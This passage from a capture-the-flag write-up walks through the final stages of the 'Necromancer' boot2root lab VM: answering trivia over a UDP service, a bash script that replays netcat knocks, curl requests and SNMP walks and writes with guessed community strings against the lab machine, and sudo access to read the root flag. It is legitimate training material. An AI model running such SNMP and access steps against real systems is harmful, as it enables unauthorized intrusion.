-rw-r--r--  1 demonslayer  demonslayer  359 May 11 18:25 .login
-rw-r--r--  1 demonslayer  demonslayer  175 May 11 18:25 .mailrc
-rw-r--r--  1 demonslayer  demonslayer  218 May 11 18:25 .profile
drwx------  2 demonslayer  demonslayer  512 May 11 18:25 .ssh
-rw-r--r--  1 demonslayer  demonslayer  706 May 11 21:19 flag8.txt
$ cat flag8.txt                                                                                                                                                                                     
You enter the Necromancer's Lair!

A stench of decay fills this place.  

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.  

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!" 

Defend yourself!  Counter attack the Necromancer's spells at u777!
```

The next challenge awaited at port 777/UDP. A quick check with ps revealed that a python script was listening on port 777/UDP

```
$ ps aux  
.
.
.
root     26992  0.0  1.6  3472  7932 ??  I      2:38AM    0:00.02 /usr/local/bin/python /root/scripts/listenu777.py (python2.7)
.
.
.
```

So I connected to it, and was promptly destroyed by the necromancer...

```
$ nc -v -u localhost 777
Connection to localhost 777 port [udp/*] succeeded!


** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  

** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  

** You only have 1 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  

** You only have 0 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  

!!!!!!! You have been defeated by The Necromancer! (*_*) !!!!!!!
```

All the ports had been closed and any progress I had made on the server was wiped clean. No problem. I re-did everything up until I got SSH access again. This time I made a quick and dirty script to pwn the machine from scratch up to the current point I was in:

```
#!/bin/bash
echo "opensesame" | nc -v -u 172.16.146.140 666
curl http://172.16.146.140/
curl http://172.16.146.140/amagicbridgeappearsatthechasm/
curl http://172.16.146.140/amagicbridgeappearsatthechasm/talisman
echo "blackmagic" | nc -v -u 172.16.146.140 31337
curl http://172.16.146.140/thenecromancerwillabsorbyoursoul/
curl http://172.16.146.140/thenecromancerwillabsorbyoursoul/necromancer
snmpwalk -v1 -c death2all 172.16.146.140
snmpwalk -v1 -c death2allrw 172.16.146.140
snmpset -v1 -c death2allrw 172.16.146.140 iso.3.6.1.2.1.1.6.0 s 'Unlocked - death2allrw!'
snmpwalk -v1 -c death2all 172.16.146.140
```

Ok, back to the challenge at hand. It wanted to know where the Black Robes practice magic of the Greater Path. I Googled "Black Robes" and "Greater Path", and found a Wikipedia page [here](https://en.wikipedia.org/wiki/Tsurani#Great_Ones). The answer was "Kelewan":

```
$ nc -u localhost 777
Kelewan


flag8{55a6af2ca3fee9f2fef81d20743bda2c}



** You only have 4 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with? 
```

More Googling, found a Wikipedia entry for [Johann Faust VIII](https://en.wikipedia.org/wiki/List_of_Shaman_King_characters#Johann_Faust_VIII), and revealed the answer was Mephistopheles.

```
Who did Johann Faust VIII make a deal with?  Mephistopheles


flag9{713587e17e796209d1df4c9c2c2d2966}



** You only have 4 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate? 
```

I initially got this wrong, because I thought it was referring to the movie "The Ninth Gate" starring Johnny Depp. It turns out the answer was "Hedge"; a character from [The Old Kingdom Trilogy](https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters#Hedge):

```
Who is tricked into passing the Ninth Gate?  Hedge


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile.
```

Doing a directory listing showed a new file called .smallvile, which I prompted read:

```
$ ls -la
total 44
drwxr-xr-x  3 demonslayer  demonslayer  512 Sep  5 06:58 .
drwxr-xr-x  3 root         wheel        512 May 11 18:25 ..
-rw-r--r--  1 demonslayer  demonslayer   87 May 11 18:25 .Xdefaults
-rw-r--r--  1 demonslayer  demonslayer  773 May 11 18:25 .cshrc
-rw-r--r--  1 demonslayer  demonslayer  103 May 11 18:25 .cvsrc
-rw-r--r--  1 demonslayer  demonslayer  359 May 11 18:25 .login
-rw-r--r--  1 demonslayer  demonslayer  175 May 11 18:25 .mailrc
-rw-r--r--  1 demonslayer  demonslayer  218 May 11 18:25 .profile
-rw-r--r--  1 demonslayer  demonslayer  196 Sep  5 06:56 .smallvile
drwx------  2 demonslayer  demonslayer  512 May 11 18:25 .ssh
-rw-r--r--  1 demonslayer  demonslayer  706 May 11 21:19 flag8.txt
$ cat .smallvile                                                                                                                                                                                    


You pick up the small vile.

Inside of it you can see a green liquid.

Opening the vile releases a pleasant odour into the air.

You drink the elixir and feel a great power within your veins!
```

No new files created after this, but I checked if I had any sudo rights and bam:

```
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
```

Nice, I could read the final flag! Taking it home:

```
$ sudo /bin/cat /root/flag11.txt



Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="
```

This was a different kind of boot2root altogether. Definitely more on the CTF side, which was a nice fun change. Cheers to [Xerebus](https://twitter.com/@xerubus) for an awesome challenge!
